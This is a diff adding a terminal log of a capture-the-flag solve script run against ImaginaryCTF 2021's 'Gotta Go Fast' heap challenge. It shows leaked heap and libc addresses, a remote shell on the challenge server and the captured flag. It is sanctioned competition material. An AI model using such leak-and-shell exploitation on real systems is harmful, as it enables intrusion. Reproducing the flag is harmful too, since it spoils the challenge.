@@ -1,0 +1,25 @@
+mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400$ python solve.py r
+[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400/gotta_go_fast'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    FORTIFY:  Enabled
+[+] Opening connection to chal.imaginaryctf.org on port 42009: Done
+heap_leak = 0x1b5d010
+heap_base = 0x1b5d000
+libc_leak = 0x7fad7a822b78
+libc_base = 0x7fad7a45e000
+[*] Switching to interactive mode
+$ id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 2876
+-rw-r--r-- 1 nobody nogroup  879740 Jul 23 06:42 admin.zip
+-rw-r--r-- 1 nobody nogroup      35 Jul 23 06:42 flag.txt
+-rwxr-xr-x 1 nobody nogroup  162632 Jul 23 06:42 ld-2.23.so
+-rwxr-xr-x 1 nobody nogroup 1868984 Jul 23 06:42 libc-2.23.so
+-rwxr-xr-x 1 nobody nogroup   21312 Jul 23 06:42 run
+$ cat flag.txt
+ictf{s4n1c_w1ns_th3_hung3r_G4M3S!}
